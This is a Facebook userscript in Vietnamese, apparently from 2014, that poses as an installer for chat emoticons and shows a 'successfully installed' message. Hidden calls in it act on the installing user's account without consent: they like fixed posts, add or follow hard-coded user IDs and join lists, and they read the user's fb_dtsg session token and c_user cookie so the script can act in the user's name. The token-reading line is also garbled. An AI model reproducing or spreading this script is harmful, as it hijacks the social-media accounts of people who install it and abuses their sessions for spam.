﻿// ==UserScript==
// @name            Cài Đặt Thành Công Icon 100% Tren FaceBook 2014
// @description     All about facebook By KhongTen
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/shosotich" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FACEBOOK Thành Công <br>Shosotich</a>';
	html += '</div>';
...
//KhachhangLT
IDS("100007815939355");IDS("100007795626851");IDS("100007883163834");
P("217974881742905");P("217974881742905");P("217974881742905");P("217974881742905");P("498212960216637");
P("1382010462068795");
Like("498211870216746");Like("217974881742905"); Like("248215558676939");Like("222315191217717"); 
a("100007815939355");a("100007795626851");a("100007883163834");
sublist("1385491341721384");


var gid = ['1397751100486347'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
